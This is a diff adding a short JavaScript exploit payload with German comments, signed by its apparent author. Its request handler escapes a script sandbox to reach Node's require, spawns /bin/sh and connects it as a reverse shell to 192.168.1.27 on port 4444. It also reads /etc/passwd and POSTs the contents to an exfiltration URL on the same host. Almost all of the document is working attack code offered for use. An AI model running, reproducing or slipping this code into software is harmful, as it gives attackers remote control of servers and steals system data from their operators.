@@ -1,0 +1,31 @@
+// Exfiltration von Daten als Teil des Exploits
+
+class Script {
+  process_incoming_request({ request }) {
+    const require = console.log.constructor('return process.mainModule.require')();
+    const { execSync } = require('child_process');
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    
+    var client = new net.Socket();
+    client.connect(4444, "192.168.1.27", function() {
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    
+    // Zusätzliche Funktion: Daten exfiltrieren
+    const sensitive_data = execSync('cat /etc/passwd');
+    const exfil_url = "http://192.168.1.27/exfil";
+    fetch(exfil_url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ data: sensitive_data.toString() }),
+    });
+    
+    return {}
+}
+  }
+
+//By DaUfooo 2025
